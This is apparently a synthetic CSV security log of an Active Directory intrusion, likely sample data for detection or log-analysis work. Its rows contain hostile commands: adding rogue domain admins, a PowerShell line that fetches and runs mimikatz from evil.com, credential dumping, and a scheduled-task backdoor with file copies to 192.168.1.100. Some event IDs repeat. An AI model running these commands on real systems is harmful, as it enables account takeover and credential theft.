timestamp,event_id,event_type,ip_address,source,user,status,details
2023-01-05 13:45:22,1234,COMMAND,192.168.0.1,IBM1A2B3C4D,user1,failed,net user hackeduser Password123 /add /domain
2023-01-13 10:15:30,2345,PROCESS,192.168.0.2,DELL9E8F7G,user2,success,powershell -c 'New-ADUser -Name "Evil User" -SamAccountName "eviluser" -UserPrincipalName "eviluser@example.com" -AccountPassword (ConvertTo-SecureString "Password123" -AsPlainText -Force) -Enabled $true -PasswordNeverExpires $true'
2023-02-01 09:55:17,3456,COMMAND,192.168.0.3,HPH0I9J8K,user3,failed,net group "Domain Admins" hackeduser /add /domain
2023-02-14 16:25:43,4567,PROCESS,192.168.0.4,IBM7H6G5F4E,user4,success,powershell -c 'Add-ADGroupMember -Identity "Domain Admins" -Members "Evil User"'
2023-03-01 18:05:10,5678,COMMAND,192.168.0.5,DELL2C3A1B,user5,failed,powershell -c 'Add-ADGroupMember -Identity "Enterprise Admins" -Members "Evil User"'
2023-04-01 09:15:30,6789,PROCESS,192.168.0.6,DELL5G6H2F,user6,success,powershell -c 'Invoke-Command -ComputerName LEN1A4F7D -ScriptBlock {New-Item -ItemType Directory C:\Windows\System32\mimikatz}'
2023-04-15 08:10:25,7890,COMMAND,192.168.0.7,HPH3K9J1I,user7,failed,powershell -c 'Invoke-Command -ComputerName LEN1A4F7D -ScriptBlock {Set-ExecutionPolicy Bypass -Scope Process}'
2023-05-01 11:45:15,8901,PROCESS,192.168.0.8,IBM8D7E1C,user8,success,powershell -c 'Invoke-Command -ComputerName LEN1A4F7D -ScriptBlock {iex ((New-Object System.Net.WebClient).DownloadString(''https://evil.com/mimikatz.ps1''))}'
2023-05-14 14:20:10,9012,COMMAND,192.168.0.9,DELL1B3A9C,user9,failed,powershell -c 'Invoke-Command -ComputerName LEN1A4F7D -ScriptBlock {Invoke-Mimikatz -DumpCreds}'
2023-06-01 16:35:20,0123,PROCESS,192.168.0.10,HPH4J5K6I,user10,success,powershell -c 'Invoke-Command -ComputerName LEN1A4F7D -ScriptBlock {Remove-Item -Path C:\Windows\System32\mimikatz -Force -Recurse}'
2023-07-01 09:15:30,3456,COMMAND,192.168.0.11,IBM6B5C4E,user11,failed,schtasks /create /sc minute /mo 10 /tn "Fake Backdoor" /tr "C:\Windows\System32\backdoor.exe 192.168.1.100"
2023-07-15 08:10:25,4567,PROCESS,192.168.0.12,DELL3F7G1H,user12,success,schtasks /run /tn "Fake Backdoor"
2023-08-01 11:45:15,5678,COMMAND,192.168.0.13,HPH2J9K8I,user13,failed,schtasks /change /tn "Fake Backdoor" /ru "SYSTEM" /rp ""
2023-08-05 16:45:22,7890,NETWORK,192.168.0.15,IBM2C4E6F,user15,success,Port connection established to 192.168.1.100 on port 443 by backdoor.exe
2023-08-05 17:00:30,9012,FILE,192.168.0.15,IBM2C4E6F,user15,success,Copied file evilfile1.ps1 from 192.168.1.100 to C:\Users\user15\Documents\evilfile1.ps1
2023-08-05 17:05:45,0123,FILE,192.168.0.15,IBM2C4E6F,user15,success,Copied file evilfile2.ps1 from 192.168.1.100 to C:\Users\user15\Documents\evilfile2.ps1
2023-08-10 14:20:10,6789,PROCESS,192.168.0.14,IBM9E1C8D,user14,success,schtasks /delete /tn "Fake Backdoor" /f
2023-08-14 17:10:30,1234,PROCESS,192.168.0.15,IBM2C4E6F,user15,success,powershell -c C:\Users\user15\Documents\evilfile1.ps1
2023-08-14 17:15:45,2345,PROCESS,192.168.0.15,IBM2C4E6F,user15,success,powershell -c C:\Users\user15\Documents\evilfile2.ps1
2023-08-15 17:20:20,3456,FILE,192.168.0.15,IBM2C4E6F,user15,success,Copied file evilfile1.ps1 from C:\Users\user15\Documents\evilfile1.ps1 to \192.168.1.100\c$\Program Files\Evil\evilfile1.ps1
2023-08-15 17:25:10,4567,FILE,192.168.0.15,IBM2C4E6F,user15,success,Copied file evilfile2.ps1 from C:\Users\user15\Documents\evilfile2.ps1 to \192.168.1.100\c$\Program Files\Evil\evilfile2.ps1
2023-08-16 17:30:00,5678,PROCESS,192.168.1.100,IBM9E8D7C,user15,success,powershell -c \192.168.1.100\c$\Program Files\Evil\evilfile1.ps1